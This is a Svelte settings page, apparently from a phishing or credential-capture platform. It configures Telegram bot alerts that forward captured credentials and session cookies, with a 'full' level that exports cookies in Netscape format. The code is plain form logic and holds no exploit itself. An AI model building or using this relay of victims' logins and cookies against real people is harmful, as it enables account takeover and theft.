<script>
	import { api } from '$lib/api/apiProxy.js';
	import Button from '$lib/components/Button.svelte';
	import Form from '$lib/components/Form.svelte';
	import FormButton from '$lib/components/FormButton.svelte';
	import FormColumn from '$lib/components/FormColumn.svelte';
	import FormColumns from '$lib/components/FormColumns.svelte';
	import FormError from '$lib/components/FormError.svelte';
	import FormFooter from '$lib/components/FormFooter.svelte';
	import FormGrid from '$lib/components/FormGrid.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import TextField from '$lib/components/TextField.svelte';
	import PasswordField from '$lib/components/PasswordField.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';
	import { onMount } from 'svelte';

	let isLoaded = false;
	let formError = '';
	let isSubmitting = false;
	let isTesting = false;

	let formValues = {
		enabled: false,
		botToken: '',
		chatID: '',
		notifyOnCapture: true,
		notifyOnSession: true,
		dataLevel: 'standard'
	};

	const dataLevels = [
		{ value: 'minimal', label: 'Minimal - IP and timestamp only' },
		{ value: 'standard', label: 'Standard - IP, UA, country, captured fields' },
		{ value: 'full', label: 'Full - All data including cookies (Netscape format)' }
	];

	onMount(async () => {
		showIsLoading();
		try {
			const res = await api.telegram.getSettings();
			if (res.success && res.data) {
				formValues = { ...formValues, ...res.data };
			}
		} catch (e) {
			// first time - no settings yet
		}
		isLoaded = true;
		hideIsLoading();
	});

	const onSubmit = async () => {
		formError = '';
		isSubmitting = true;
		try {
			const res = await api.telegram.saveSettings(formValues);
			if (res.success) {
				addToast('Telegram settings saved', 'Success');
			} else {
				formError = res.error || 'Failed to save settings';
			}
		} catch (e) {
			formError = 'An error occurred while saving settings';
		}
		isSubmitting = false;
	};

	const onTest = async () => {
		isTesting = true;
		try {
			const res = await api.telegram.test(formValues);
			if (res.success) {
				addToast('Test message sent to Telegram', 'Success');
			} else {
				addToast(res.error || 'Failed to send test message', 'Error');
			}
		} catch (e) {
			addToast('Failed to send test message', 'Error');
		}
		isTesting = false;
	};
</script>

<HeadTitle title="Telegram Notifications" />

{#if isLoaded}
	<Headline title="Telegram Notifications" subtitle="Configure real-time Telegram alerts for captured credentials and session completions." />

	<Form on:submit={onSubmit}>
		<FormGrid>
			<FormColumns>
				<FormColumn>
					<div class="flex items-center gap-3 mb-4">
						<label class="relative inline-flex items-center cursor-pointer">
							<input type="checkbox" bind:checked={formValues.enabled} class="sr-only peer" />
							<div class="w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-300 dark:peer-focus:ring-blue-800 rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-blue-600"></div>
							<span class="ml-3 text-sm font-medium text-gray-900 dark:text-gray-300">Enable Telegram Notifications</span>
						</label>
					</div>
				</FormColumn>
			</FormColumns>

			<FormColumns>
				<FormColumn>
					<PasswordField
						label="Bot Token"
						placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
						bind:value={formValues.botToken}
						helpText="Create a bot via @BotFather on Telegram to get a token."
					/>
				</FormColumn>
				<FormColumn>
					<TextField
						label="Chat ID"
						placeholder="-1001234567890"
						bind:value={formValues.chatID}
						helpText="The Telegram chat/group/channel ID to receive notifications."
					/>
				</FormColumn>
			</FormColumns>

			<FormColumns>
				<FormColumn>
					<div class="space-y-3">
						<label class="flex items-center gap-2">
							<input type="checkbox" bind:checked={formValues.notifyOnCapture} class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
							<span class="text-sm text-gray-700 dark:text-gray-300">Notify on credential capture</span>
						</label>
						<label class="flex items-center gap-2">
							<input type="checkbox" bind:checked={formValues.notifyOnSession} class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
							<span class="text-sm text-gray-700 dark:text-gray-300">Notify on session/cookie capture</span>
						</label>
					</div>
				</FormColumn>
				<FormColumn>
					<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Data Level</label>
					<select bind:value={formValues.dataLevel} class="block w-full rounded-md border-gray-300 shadow-sm focus:border-blue-500 focus:ring-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:text-white sm:text-sm">
						{#each dataLevels as level}
							<option value={level.value}>{level.label}</option>
						{/each}
					</select>
					<p class="mt-1 text-xs text-gray-500 dark:text-gray-400">Controls how much data is included in each notification.</p>
				</FormColumn>
			</FormColumns>

			<FormError error={formError} />

			<FormFooter>
				<FormButton type="submit" disabled={isSubmitting}>
					{isSubmitting ? 'Saving...' : 'Save Settings'}
				</FormButton>
				<Button backgroundColor="bg-gray-500" on:click={onTest} disabled={isTesting || !formValues.botToken || !formValues.chatID}>
					{isTesting ? 'Sending...' : 'Send Test Message'}
				</Button>
			</FormFooter>
		</FormGrid>
	</Form>
{/if}
